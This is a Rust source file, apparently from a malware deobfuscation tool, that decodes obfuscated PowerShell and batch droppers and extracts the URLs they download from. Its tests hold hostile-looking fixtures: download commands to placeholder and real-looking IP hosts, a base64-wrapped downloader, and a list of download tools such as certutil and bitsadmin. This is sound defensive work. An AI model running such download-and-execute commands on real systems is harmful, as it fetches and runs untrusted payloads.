    } else if looks_like_keyed_base64_xor_payload(raw_env_expanded) {
        expand_keyed_base64_xor_payload_fast(raw_env_expanded)
    } else if looks_like_for_substring_stride_payload(raw_env_expanded) {
        expand_for_substring_stride_fast_path_payload(raw_env_expanded)
    } else {
        expand_obfuscation_with_env(raw_env_expanded, env)
    };
    expansion_cache.insert(key, expanded.clone());
    expanded
}

fn looks_like_keyed_base64_xor_payload(text: &str) -> bool {
    contains_ascii_case_insensitive(text, "function")
        && contains_ascii_case_insensitive(text, "frombase64st")
        && contains_ascii_case_insensitive(text, "-bxor")
        && text.contains("@(")
}

fn expand_keyed_base64_xor_payload_fast(text: &str) -> String {
    let mut out = normalize_powershell_quotes(text);
    out = repair_damaged_webclient_constructor_method(&out);
    out = expand_keyed_base64_xor_string_fragments(&out);
    expand_ps_variables(&out)
}

fn ps_download_cmd_context(idx: usize, context: &str, url: &str) -> String {
    let context = trim_unmatched_trailing_wrapper_quote(context.trim());
    if let Some(call) = ps_download_method_call_context(context, url) {
        return format!("(ps1 #{idx}) {call}");
    }
    if context.len() <= 320 && !contains_long_hex_run(context) {
        return format!("(ps1 #{idx}) {context}");
    }

    if let Some(pos) = context.find(url) {
        let mut start = floor_char_boundary(context, pos.saturating_sub(120));
        let prefix = &context[..pos];
        if let Some(boundary) = prefix
            .rfind(';')
            .or_else(|| prefix.rfind('|'))
            .or_else(|| prefix.rfind('='))
        {
            if boundary + 1 > start {
                start = floor_char_boundary(context, boundary + 1);
            }
        }
        let end = floor_char_boundary(context, (pos + url.len() + 120).min(context.len()));
        let mut slice = context[start..end].trim().to_string();
        if start > 0 {
            slice.insert_str(0, "... ");
        }
        if end < context.len() {
            slice.push_str(" ...");
        }
        return format!("(ps1 #{idx}) {slice}");
    }

    let end = floor_char_boundary(context, context.len().min(240));
    let suffix = if end < context.len() { " ..." } else { "" };
    format!("(ps1 #{idx}) {}{suffix}", context[..end].trim())
}

fn ps_url_assignment_name(statement: &str, raw_url: &str) -> Option<String> {
    let trimmed = statement.trim();
    if contains_ascii_case_insensitive(trimmed, "downloadfile")
        || contains_ascii_case_insensitive(trimmed, "downloadstring")
        || contains_ascii_case_insensitive(trimmed, "loadstring")
        || contains_ascii_case_insensitive(trimmed, "adstring")
        || contains_ascii_case_insensitive(trimmed, "invoke-webrequest")
        || contains_ascii_case_insensitive(trimmed, "invoke-restmethod")
        || contains_ascii_case_insensitive(trimmed, " start-process ")
    {
        return None;
    }
    if let Some(caps) = PS_URL_ASSIGNMENT_RE.captures(trimmed) {
        if let Some(full) = caps.get(0) {
            if assignment_value_starts_with_url(trimmed, full.end(), raw_url) {
                return caps.get(1).map(|m| m.as_str().to_string());
            }
        }
    }
    if let Some(name) = BATCH_SET_URL_ASSIGNMENT_RE
        .captures(trimmed)
        .and_then(|caps| {
            let full = caps.get(0)?;
            if assignment_value_starts_with_url(trimmed, full.end(), raw_url) {
                caps.get(1).map(|m| m.as_str().to_string())
            } else {
                None
            }
        })
    {
        return Some(name);
    }

    if contains_ascii_case_insensitive(trimmed, "powershell") {
        if let Some(pos) = trimmed.find('$') {
            if let Some(name) = ps_url_assignment_name(&trimmed[pos..], raw_url) {
                return Some(name);
            }
        }
        if let Some(pos) = find_ascii_case_insensitive_from(trimmed, "set ", 0) {
            if let Some(name) = ps_url_assignment_name(&trimmed[pos..], raw_url) {
                return Some(name);
            }
        }
    }

    None
}

fn assignment_value_starts_with_url(statement: &str, value_start: usize, raw_url: &str) -> bool {
    let Some(tail) = statement.get(value_start..) else {
        return false;
    };
    let tail = tail.trim_start();
    let tail = tail
        .strip_prefix('"')
        .or_else(|| tail.strip_prefix('\''))
        .unwrap_or(tail);
    tail.starts_with(raw_url)
}

fn ps_text_uses_variable_as_download_source(text: &str, name: &str) -> bool {
    if !contains_ascii_case_insensitive(text, "invoke-webrequest")
        && !contains_ascii_case_insensitive(text, "invoke-restmethod")
        && !contains_ascii_case_insensitive(text, "downloadfile")
        && !contains_ascii_case_insensitive(text, "downloadstring")
        && !contains_ascii_case_insensitive(text, "curl")
        && !contains_ascii_case_insensitive(text, "wget")
    {
        return false;
    }
    let lower = text.to_ascii_lowercase();
    let name = name.to_ascii_lowercase();
    lower.contains(&format!("${name}")) || lower.contains(&format!("!{name}!"))
}

fn ps_url_is_secondary_downloadfile_argument_url(text: &str, url_start: usize) -> bool {
    let Some(prefix) = text.get(..url_start) else {
        return false;
    };
    let Some(quote_start) = prefix.rfind(['\'', '"']) else {
        return false;
    };
    let quote = text.as_bytes()[quote_start];
    let Some(literal_tail) = text.get(quote_start + 1..) else {
        return false;
    };
    let Some(quote_end_rel) = literal_tail.as_bytes().iter().position(|&b| b == quote) else {
        return false;
    };
    let quote_end = quote_start + 1 + quote_end_rel;
    if url_start >= quote_end {
        return false;
    }

    let lower_before_quote = text[..quote_start].to_ascii_lowercase();
    let Some(method_pos) = lower_before_quote.rfind("downloadfile") else {
        return false;
    };
    let Some(open_rel) = text[method_pos..quote_start].find('(') else {
        return false;
    };
    let open = method_pos + open_rel;
    if !text[open + 1..quote_start].trim().is_empty() {
        return false;
    }

    let literal_before_url = &text[quote_start + 1..url_start];
    literal_before_url.contains("://")
        || crate::deob_scan::normalize_liberal_url_token(literal_before_url).is_some()
}

fn ps_download_method_call_context<'a>(context: &'a str, url: &str) -> Option<&'a str> {
    let url_pos = context.find(url)?;
    let lower = context.to_ascii_lowercase();
    let prefix = &lower[..url_pos.min(lower.len())];
    let method_pos = prefix
        .rfind("downloadfile")
        .or_else(|| prefix.rfind("downloadstring"))?;
    let open_rel = context[method_pos..].find('(')?;
    let open = method_pos + open_rel;
    let end = matching_ps_call_end(context, open).unwrap_or_else(|| {
        floor_char_boundary(context, (url_pos + url.len() + 80).min(context.len()))
    });

    let mut start = method_call_context_start(context, method_pos);
    while start < method_pos
        && context[start..]
            .chars()
            .next()
            .is_some_and(|ch| ch.is_whitespace() || ch == '\'' || ch == '"')
    {
        start += context[start..]
            .chars()
            .next()
            .map(char::len_utf8)
            .unwrap_or(1);
    }
    let slice = context[start..end].trim();
    (!slice.is_empty() && slice.contains(url)).then_some(slice)
}

fn method_call_context_start(context: &str, method_pos: usize) -> usize {
    let prefix = &context[..method_pos];
    let boundary = prefix
        .rfind(';')
        .or_else(|| prefix.rfind('|'))
        .or_else(|| prefix.rfind('='))
        .map(|idx| idx + 1)
        .unwrap_or(0);
    floor_char_boundary(context, boundary)
}

fn matching_ps_call_end(context: &str, open: usize) -> Option<usize> {
    let mut depth = 0usize;
    let mut quote: Option<char> = None;
    let mut escaped = false;
    for (idx, ch) in context[open..].char_indices() {
        let abs = open + idx;
        if let Some(q) = quote {
            if escaped {
                escaped = false;
                continue;
            }
            if ch == '`' || ch == '\\' {
                escaped = true;
                continue;
            }
            if ch == q {
                quote = None;
            }
            continue;
        }
        match ch {
            '\'' | '"' => quote = Some(ch),
            '(' => depth += 1,
            ')' => {
                depth = depth.saturating_sub(1);
                if depth == 0 {
                    return Some(abs + ch.len_utf8());
                }
            }
            _ => {}
        }
    }
    None
}

fn trim_unmatched_trailing_wrapper_quote(context: &str) -> &str {
    let Some(last) = context.as_bytes().last().copied() else {
        return context;
    };
    if last != b'"' && last != b'\'' {
        return context;
    }
    if ascii_quote_count_is_odd(context.as_bytes(), last) {
        context[..context.len() - 1].trim_end()
    } else {
        context
    }
}

fn ascii_quote_count_is_odd(bytes: &[u8], quote: u8) -> bool {
    let mut count = 0usize;
    let mut escaped = false;
    for &byte in bytes {
        if escaped {
            escaped = false;
            continue;
        }
        if byte == b'`' || byte == b'\\' {
            escaped = true;
            continue;
        }
        if byte == quote {
            count += 1;
        }
    }
    count % 2 == 1
}

fn contains_long_hex_run(value: &str) -> bool {
    let mut run = 0usize;
    for byte in value.bytes() {
        if byte.is_ascii_hexdigit() {
            run += 1;
            if run >= 96 {
                return true;
            }
        } else {
            run = 0;
        }
    }
    false
}

fn ps_reversed_urls(text: &str) -> Vec<String> {
    let lower = text.to_ascii_lowercase();
    if !lower.contains("//:ptth") && !lower.contains("//:sptth") {
        return Vec::new();
    }
    let mut out = Vec::new();
    let mut seen = std::collections::HashSet::new();
    for caps in PS_REVERSED_URL_TOKEN_RE.captures_iter(text).take(32) {
        let Some(token) = caps.get(1) else { continue };
        let token = token
            .as_str()
            .trim_start_matches(|ch: char| !ch.is_ascii_lowercase());
        if token.is_empty() {
            continue;
        }
        let reversed = reverse_literal_value(token);
        let Some(url) = crate::deob_scan::normalize_liberal_url_token(&reversed) else {
            continue;
        };
        if seen.insert(url.clone()) {
            out.push(url);
        }
    }
    out
}

const LARGE_PS1_FAST_PATH_BYTES: usize = 96 * 1024;
const LARGE_PS1_REPORT_FAST_PATH_BYTES: usize = 96 * 1024;

fn expand_large_compressed_ps1_stage_before_sampling(
    text: &str,
    deadline: Option<std::time::Instant>,
) -> (String, bool) {
    if ps_deadline_expired(deadline)
        || !contains_ascii_case_insensitive(text, "frombase64string")
        || (!contains_ascii_case_insensitive(text, "gzipstream")
            && !contains_ascii_case_insensitive(text, "deflatestream"))
    {
        return (text.to_string(), ps_deadline_expired(deadline));
    }

    let mut expanded = expand_gzip_function_base64_variables(text);
    if ps_deadline_expired(deadline) {
        return (expanded, true);
    }
    expanded = expand_gzip_base64_literals(&expanded);
    if expanded == text {
        return (expanded, ps_deadline_expired(deadline));
    }

    if let Some(stage) = invoked_literal_stage(&expanded) {
        return (stage, ps_deadline_expired(deadline));
    }
    (expanded, ps_deadline_expired(deadline))
}

fn invoked_literal_stage(text: &str) -> Option<String> {
    let bindings = ps_string_bindings(text);
    if bindings.is_empty() {
        return None;
    }
    for caps in PS_INVOKE_EXPRESSION_VAR_RE.captures_iter(text) {
        let var = caps.get(1)?.as_str().to_ascii_lowercase();
        let stage = bindings.get(&var)?;
        if stage.trim().len() >= 128 {
            return Some(stage.clone());
        }
    }
    None
}

pub(crate) fn scan_large_ps1_payload_bytes_fast(payload: &[u8], env: &mut Environment) {
    let text = decode_payload(payload);
    scan_large_ps1_payload_fast(&text, env);
}

fn scan_large_ps1_payload_fast(text: &str, env: &mut Environment) {
    if env.check_timeout() {
        return;
    }
    if looks_like_deflate_xor_base64_assembly_loader(text) {
        let sampled = head_tail_sample(text, 48 * 1024);
        crate::deob_scan::scan_extracted_script_text(&sampled, env);
        return;
    }
    let (large_text, timed_out) =
        expand_large_compressed_ps1_stage_before_sampling(text, env.limits.deadline);
    if timed_out {
        env.note_timeout();
        return;
    }
    let sampled = head_tail_sample(&large_text, 48 * 1024);
    crate::deob_scan::scan_extracted_script_text(&sampled, env);
    if env.check_timeout() {
        return;
    }
    let sampled = expand_ps_env_refs(&sampled, env);
    let (text_expanded, timed_out) = if looks_like_dense_skip_nth_payload(&sampled) {
        (expand_dense_skip_nth_payload(&sampled), false)
    } else if looks_like_for_substring_stride_payload(&sampled) {
        (
            expand_for_substring_stride_fast_path_payload(&sampled),
            false,
        )
    } else if large_ps1_report_sample_needs_normalization(&sampled) {
        expand_obfuscation_until(&sampled, env.limits.deadline)
    } else {
        (sampled, false)
    };
    if timed_out {
        env.note_timeout();
        return;
    }
    let text_aliased = crate::ps_alias::expand_aliases_if_ps(&text_expanded);
    let candidates: Vec<String> = if text_aliased != text_expanded {
        vec![text_expanded, text_aliased]
    } else {
        vec![text_expanded]
    };
    let primary = &candidates[0];
    let known_launch_urls: std::collections::HashSet<String> = env
        .traits
        .iter()
        .filter_map(|t| match t {
            Trait::UrlLaunch { url, .. } => Some(url.clone()),
            _ => None,
        })
        .collect();
    let regexes: &[&Lazy<Regex>] = &[
        &IWR_RE,
        &IRM_RE,
        &PS_SCHEMELESS_IP_CMDLET_RE,
        &PS_SCHEMELESS_DOMAIN_CMDLET_RE,
        &CURL_EXE_RE,
        &MSHTA_URL_RE,
        &DOWNLOADSTRING_RE,
        &BARE_DOWNLOADSTRING_RE,
        &DOWNLOADSTRING_FRAGMENT_RE,
        &CALLBYNAME_DOWNLOADSTRING_RE,
        &START_BITS_RE,
        &START_BITS_SCHEMELESS_SOURCE_RE,
        &NET_REQ_RE,
        &PS_GENERIC_URL_RE,
    ];
    let mut seen = std::collections::HashSet::new();
    for candidate in &candidates {
        for re in regexes {
            if env.check_timeout() {
                return;
            }
            for caps in re.captures_iter(candidate) {
                let Some(url_match) = caps.get(1) else {
                    continue;
                };
                if ps_url_inside_non_download_hash_option(candidate, url_match.start())
                    || ps_url_is_non_download_option_value(candidate, url_match.start())
                    || ps_url_inside_path_getfilename(candidate, url_match.start())
                {
                    continue;
                }
                let mut url = clean_ps_url(url_match.as_str());
                if is_schemeless_ip_url(&url) {
                    url = format!("http://{url}");
                }
                let Some(url) = crate::deob_scan::normalize_liberal_url_token(&url)
                    .or_else(|| crate::deob_scan::normalize_schemeless_domain_path_token(&url))
                else {
                    continue;
                };
                if known_launch_urls.contains(&url) || !seen.insert(url.clone()) {
                    continue;
                }
                let statement = caps
                    .get(0)
                    .map(|m| logical_statement_at(candidate, m.start()))
                    .unwrap_or(primary);
                if let Some(name) = ps_url_assignment_name(statement, url_match.as_str()) {
                    if !ps_text_uses_variable_as_download_source(candidate, &name) {
                        env.traits.push(Trait::UrlVariable {
                            name,
                            url,
                            cmd: format!("(ps1 large) {statement}"),
                        });
                        continue;
                    }
                }
                env.traits.push(Trait::Download {
                    cmd: format!("(ps1 large) {statement}"),
                    src: url,
                    dst: outfile_hint_from(statement),
                });
            }
        }

        for url in dynamic_download_invoke_urls(candidate)
            .into_iter()
            .chain(ps_literal_urls_in_download_context(candidate))
        {
            if known_launch_urls.contains(&url) || !seen.insert(url.clone()) {
                continue;
            }
            env.traits.push(Trait::Download {
                cmd: format!("(ps1 large) {primary}"),
                src: url,
                dst: outfile_hint_from(primary),
            });
        }
    }
}

fn head_tail_sample(text: &str, side_len: usize) -> String {
    if text.len() <= side_len.saturating_mul(2) {
        return text.to_string();
    }
    let head_end = floor_char_boundary(text, side_len);
    let tail_start = floor_char_boundary(text, text.len().saturating_sub(side_len));
    let mut out = String::with_capacity(head_end + (text.len() - tail_start) + 72);
    out.push_str(&text[..head_end]);
    out.push_str("\r\n# batdeob: omitted middle of large extracted PowerShell payload\r\n");
    out.push_str(&text[tail_start..]);
    out
}

fn ps_url_inside_non_download_hash_option(text: &str, url_start: usize) -> bool {
    let stmt_start = text[..url_start]
        .rfind(['\r', '\n', ';'])
        .map_or(0, |idx| idx + 1);
    let before_url = &text[stmt_start..url_start];
    let lower = before_url.to_ascii_lowercase();
    for option in ["-headers", "-body"] {
        let Some(option_pos) = rfind_ps_option_token(&lower, option) else {
            continue;
        };
        let after_option = &before_url[option_pos..];
        let Some(hash_rel) = after_option.rfind("@{") else {
            continue;
        };
        let hash_start = stmt_start + option_pos + hash_rel;
        if !text[hash_start..url_start].contains('}') {
            return true;
        }
    }
    false
}

fn rfind_ps_option_token(lower: &str, option: &str) -> Option<usize> {
    let mut search_end = lower.len();
    while let Some(pos) = lower[..search_end].rfind('-') {
        let before_boundary = pos == 0
            || lower.as_bytes()[pos - 1].is_ascii_whitespace()
            || matches!(lower.as_bytes()[pos - 1], b'(' | b';');
        let after = lower[pos..]
            .find(|ch: char| !ch.is_ascii_alphanumeric() && ch != '-')
            .map_or(lower.len(), |rel| pos + rel);
        let after_boundary = after == lower.len()
            || lower.as_bytes()[after].is_ascii_whitespace()
            || matches!(lower.as_bytes()[after], b':' | b'=');
        if before_boundary && after_boundary && ps_option_token_matches(&lower[pos..after], option)
        {
            return Some(pos);
        }
        search_end = pos;
    }
    None
}

fn ps_option_token_matches(token: &str, option: &str) -> bool {
    let token = token.trim_start_matches('-');
    let option = option.trim_start_matches('-');
    let min_len = match option {
        "headers" | "body" => 2,
        "useragent" => 5,
        "proxylist" => 6,
        _ => option.len(),
    };
    token.len() >= min_len && token.len() <= option.len() && option.starts_with(token)
}

fn ps_url_is_non_download_option_value(text: &str, url_start: usize) -> bool {
    let stmt_start = text[..url_start]
        .rfind(['\r', '\n', ';'])
        .map_or(0, |idx| idx + 1);
    let before_url = &text[stmt_start..url_start];
    ps_non_download_option_before_value(
        before_url.trim_end_matches([' ', '\t', '\r', '\n', '"', '\'', '(', '=', ':']),
    ) || ps_quoted_non_download_option_before_value(before_url)
}

fn ps_url_inside_path_getfilename(text: &str, url_start: usize) -> bool {
    let window_start = floor_char_boundary(text, url_start.saturating_sub(128));
    let before_url = text[window_start..url_start].to_ascii_lowercase();
    before_url
        .rfind("getfilename")
        .is_some_and(|pos| before_url[pos..].contains('(') && !before_url[pos..].contains(')'))
}

fn ps_quoted_non_download_option_before_value(before_url: &str) -> bool {
    let Some((quote_pos, _)) = before_url
        .char_indices()
        .rev()
        .find(|(_, ch)| *ch == '"' || *ch == '\'')
    else {
        return false;
    };
    ps_non_download_option_before_value(before_url[..quote_pos].trim_end())
}

fn ps_non_download_option_before_value(before_value: &str) -> bool {
    let Some(option) = before_value.split_whitespace().last() else {
        return false;
    };
    let option = option.trim_end_matches(['=', ':']);
    ps_option_token_matches(&option.to_ascii_lowercase(), "-body")
        || option.eq_ignore_ascii_case("-proxy")
        || ps_option_token_matches(&option.to_ascii_lowercase(), "-proxylist")
        || ps_option_token_matches(&option.to_ascii_lowercase(), "-useragent")
}

fn clean_ps_url(raw: &str) -> String {
    let mut url = raw.trim().trim_matches(['"', '\'']).to_string();
    if let Some(end) = ps_url_shell_separator_pos(&url) {
        url.truncate(end);
    }
    for marker in ['[', '{'] {
        if let Some(pos) = url.find(marker) {
            url.truncate(pos);
        }
    }
    url.truncate(
        url.trim_end_matches(['.', ',', ';', ':', ')', ']', '}', '"', '\'', '`'])
            .len(),
    );
    url
}

fn ps_url_shell_separator_pos(url: &str) -> Option<usize> {
    let bytes = url.as_bytes();
    let mut idx = 0usize;
    while idx < bytes.len() {
        match bytes[idx] {
            b'|' => return Some(idx),
            b'&' if bytes.get(idx + 1) == Some(&b'&') => return Some(idx),
            b'&' if ps_url_ampersand_starts_command(&url[idx + 1..]) => return Some(idx),
            _ => idx += 1,
        }
    }
    None
}

fn ps_url_ampersand_starts_command(after_ampersand: &str) -> bool {
    let after = after_ampersand.trim_start();
    let command_end = after
        .find(|ch: char| !ch.is_ascii_alphanumeric() && ch != '-' && ch != '_' && ch != '.')
        .unwrap_or(after.len());
    let command = &after[..command_end];
    if command.is_empty() || after[command_end..].starts_with('=') {
        return false;
    }
    matches!(
        command.to_ascii_lowercase().as_str(),
        "curl"
            | "curl.exe"
            | "wget"
            | "iwr"
            | "irm"
            | "invoke-webrequest"
            | "invoke-restmethod"
            | "powershell"
            | "powershell.exe"
            | "cmd"
            | "cmd.exe"
            | "certutil"
            | "certutil.exe"
            | "bitsadmin"
            | "bitsadmin.exe"
            | "mshta"
            | "mshta.exe"
            | "start"
            | "call"
    )
}

fn is_schemeless_ip_url(url: &str) -> bool {
    let Some(host) = url.split([':', '/']).next() else {
        return false;
    };
    let mut parts = host.split('.');
    let octets = [
        parts.next(),
        parts.next(),
        parts.next(),
        parts.next(),
        parts.next(),
    ];
    if octets[4].is_some() {
        return false;
    }
    octets[..4]
        .iter()
        .all(|part| part.and_then(|p| p.parse::<u8>().ok()).is_some())
}

pub fn scan_inline_powershell_text(text: &str, env: &mut Environment) {
    if env.check_timeout() {
        return;
    }
    let filtered = text
        .lines()
        .filter(|line| !crate::deob_scan::command_starts_with_echo(line))
        .collect::<Vec<_>>()
        .join("\n");
    let scan_text = if filtered.len() == text.len() {
        text
    } else {
        filtered.as_str()
    };
    let lower = scan_text.to_ascii_lowercase();
    if !lower.contains("powershell")
        && !lower.contains("downloadstring")
        && !lower.contains("downloadfile")
        && !lower.contains("downloaddata")
        && !lower.contains("callbyname")
        && !lower.contains("invoke-expression")
        && !lower.contains("iex")
        && !lower.contains("-bxor")
        && !lower.contains("gzipstream")
    {
        return;
    }
    let known_downloads: std::collections::HashSet<String> = env
        .traits
        .iter()
        .filter_map(|t| match t {
            Trait::Download { src, .. } => Some(src.clone()),
            _ => None,
        })
        .collect();
    let mut payload_env = Environment::new(&crate::env::Config {
        max_depth: env.limits.max_depth,
        max_iterations: env.limits.max_iterations,
        max_child_scripts: env.limits.max_child_scripts,
        timeout_secs: 0,
        self_extract: false,
        winver: env.winver,
        max_output_bytes: env.limits.max_output_bytes,
        max_output_line_bytes: env.limits.max_output_line_bytes,
        max_traits_per_kind: 100,
    });
    payload_env.limits.deadline = env.limits.deadline;
    if lower.contains("powershell") || lower.contains("pwsh") {
        crate::deob_scan::scan_embedded_powershell_invocations(scan_text, &mut payload_env);
        payload_env
            .all_extracted_ps1
            .extend(std::mem::take(&mut payload_env.exec_ps1));
    }
    payload_env
        .all_extracted_ps1
        .push(scan_text.as_bytes().to_vec());
    scan_ps1_payloads(&mut payload_env);
    env.traits
        .extend(payload_env.traits.into_iter().filter(|t| match t {
            Trait::Download { src, .. } => !known_downloads.contains(src),
            _ => true,
        }));
}

#[cfg(test)]
mod timeout_tests {
    use super::{scan_inline_powershell_text, scan_ps1_payloads};
    use crate::env::{Config, Environment};
    use crate::traits::Trait;
    use std::time::{Duration, Instant};

    fn expired_env() -> Environment {
        let mut env = Environment::new(&Config {
            timeout_secs: 0,
            ..Config::default()
        });
        env.limits.deadline = Some(Instant::now() - Duration::from_secs(1));
        env
    }

    #[test]
    fn inline_powershell_scan_honors_expired_parent_deadline() {
        let mut env = expired_env();

        scan_inline_powershell_text(
            "powershell -Command \"Invoke-WebRequest -Uri https://deadline.example/p\"",
            &mut env,
        );

        assert!(
            env.traits.iter().any(|t| matches!(t, Trait::TimeoutHit)),
            "expired inline PowerShell scan did not emit TimeoutHit: {:?}",
            env.traits
        );
        assert!(
            !env.traits
                .iter()
                .any(|t| matches!(t, Trait::Download { .. })),
            "expired inline PowerShell scan should not continue extracting: {:?}",
            env.traits
        );
    }

    #[test]
    fn ps1_payload_scan_honors_expired_deadline_before_scanning() {
        let mut env = expired_env();
        assert!(
            env.push_extracted_ps1(b"Invoke-WebRequest -Uri https://deadline.example/p".to_vec())
        );
        env.all_extracted_ps1
            .extend(std::mem::take(&mut env.exec_ps1));

        scan_ps1_payloads(&mut env);

        assert!(
            env.traits.iter().any(|t| matches!(t, Trait::TimeoutHit)),
            "expired ps1 payload scan did not emit TimeoutHit: {:?}",
            env.traits
        );
        assert!(
            !env.traits
                .iter()
                .any(|t| matches!(t, Trait::Download { .. })),
            "expired ps1 payload scan should not continue extracting: {:?}",
            env.traits
        );
    }
}

#[cfg(test)]
mod inline_frombase64_variable_tests {
    use super::scan_ps1_payloads;
    use crate::env::{Config, Environment};

    #[test]
    fn variable_frombase64_getstring_inner_is_queued_for_rescan() {
        let wrapper = r#"
$Codigo = 'SW52b2tlLVdlYlJlcXVlc3QgLVVyaSBodHRwczovL2Zyb20tYjY0LXZhci5leGFtcGxlL3A='
$Decoded = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($Codigo))
powershell.exe -command $Decoded
"#;
        let mut env = Environment::new(&Config::default());
        assert!(env.push_extracted_ps1(wrapper.as_bytes().to_vec()));
        env.all_extracted_ps1
            .extend(std::mem::take(&mut env.exec_ps1));

        scan_ps1_payloads(&mut env);

        assert!(
            env.all_extracted_ps1.iter().any(|payload| {
                String::from_utf8_lossy(payload)
                    .contains("Invoke-WebRequest -Uri https://from-b64-var.example/p")
            }),
            "decoded variable-backed FromBase64String payload was not queued: {:?}",
            env.all_extracted_ps1
        );
    }
}

#[cfg(test)]
mod reversed_url_tests {
    use super::ps_reversed_urls;

    #[test]
    fn extracts_reversed_http_url_tokens() {
        assert_eq!(
            ps_reversed_urls("'txt.sgarevets/jxsn/151.11.691.581//:ptth'"),
            vec!["http://185.196.11.151/nsxj/steverags.txt".to_string()]
        );
    }

    #[test]
    fn trims_marker_prefix_before_reversing_url_tokens() {
        assert_eq!(
            ps_reversed_urls("@(8LUtxt.sgarevets/jxsn/151.11.691.581//:ptth8LU"),
            vec!["http://185.196.11.151/nsxj/steverags.txt".to_string()]
        );
    }
}

#[cfg(test)]
mod ps_download_context_tests {
    use super::{
        ps_download_cmd_context, ps_url_inside_path_getfilename,
        ps_url_is_secondary_downloadfile_argument_url,
    };

    #[test]
    fn long_hex_context_is_sliced_around_url() {
        let url = "https://context.example/payload";
        let context = format!(
            "$A{}='prefix';Invoke-Expression('{url}');$B{}",
            "A".repeat(220),
            "B".repeat(220)
        );
        let cmd = ps_download_cmd_context(3, &context, url);

        assert!(cmd.contains(url), "{cmd}");
        assert!(cmd.len() < 360, "{cmd}");
        assert!(cmd.starts_with("(ps1 #3) ... "), "{cmd}");
    }

    #[test]
    fn short_downloadfile_context_trims_outer_command_quote() {
        let url = "https://context.example/Document.zip";
        let context = "(New-Object -TypeName System.Net.WebClient).DownloadFile('https://context.example/Document.zip', 'C:\\Users\\Public\\Document.zip')\"";
        let cmd = ps_download_cmd_context(2, context, url);

        assert!(
            cmd.ends_with("Document.zip')"),
            "dangling wrapper quote leaked into command context: {cmd}"
        );
    }

    #[test]
    fn short_assignment_wrapped_downloadfile_context_uses_method_call() {
        let url = "http://194.59.31.187/Craft67.csv";
        let context =
            "$Plastfiberoptisk='$Betalingsstandsningernes189.DownloadFile('http://194.59.31.187/Craft67.csv ',$Piaffes) '";
        let cmd = ps_download_cmd_context(0, context, url);

        assert!(
            cmd.contains("$Betalingsstandsningernes189.DownloadFile("),
            "method call missing from context: {cmd}"
        );
        assert!(
            !cmd.contains("$Plastfiberoptisk="),
            "assignment wrapper leaked into context: {cmd}"
        );
    }

    #[test]
    fn secondary_urls_inside_one_downloadfile_literal_are_not_promoted() {
        let text = "$wc.DownloadFile('https://first.example/a>http://second.example/b>https://third.example/c ',$dst)";
        let first_pos = text.find("https://first").unwrap_or(usize::MAX);
        let second_pos = text.find("http://second").unwrap_or(usize::MAX);
        let third_pos = text.find("https://third").unwrap_or(usize::MAX);

        assert!(
            !ps_url_is_secondary_downloadfile_argument_url(text, first_pos),
            "first URL in DownloadFile argument should remain primary"
        );
        assert!(
            ps_url_is_secondary_downloadfile_argument_url(text, second_pos),
            "second separator-glued URL should be secondary"
        );
        assert!(
            ps_url_is_secondary_downloadfile_argument_url(text, third_pos),
            "third separator-glued URL should be secondary"
        );
    }

    #[test]
    fn getfilename_url_filter_handles_utf8_before_sliding_window() {
        let url = "https://context.example/payload";
        let text = format!("{}[IO.Path]::GetFileName({url})", "x上".repeat(50));
        assert!(text.contains(url), "URL must be present");
        let url_start = text.find(url).unwrap_or_default();

        assert!(
            !text.is_char_boundary(url_start - 128),
            "test fixture must force the prior-byte window into a UTF-8 character"
        );
        assert!(ps_url_inside_path_getfilename(&text, url_start));
    }
}
